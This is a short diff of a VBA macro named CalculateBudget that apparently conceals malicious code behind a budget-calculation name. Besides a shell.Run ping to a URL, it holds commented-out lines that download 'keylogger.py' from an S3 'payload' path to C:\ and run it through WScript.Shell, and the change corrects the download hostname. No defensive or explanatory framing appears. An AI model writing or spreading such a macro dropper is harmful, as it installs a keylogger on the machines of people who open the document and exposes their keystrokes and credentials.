@@ -7,7 +7,7 @@ Sub CalculateBudget()
     result = shell.Run("ping " & Url, 0, True)
 
 'Download Python Script
-'strCommand = "invoke-webrequest -Uri "https://pub6075.s3.ap-southeast-#1.amazonaws.com/payload/keylogger.py" -OutFile "C:\keylogger.py" -UseDefaultCredentials
+'strCommand = "invoke-webrequest -Uri "https://pub6075.s3.ap-southeast-1.amazonaws.com/payload/keylogger.py" -OutFile "C:\keylogger.py" -UseDefaultCredentials
 'Set WsShell = CreateObject("WScript.Shell")
 'WsShell.Run (strCommand)
 
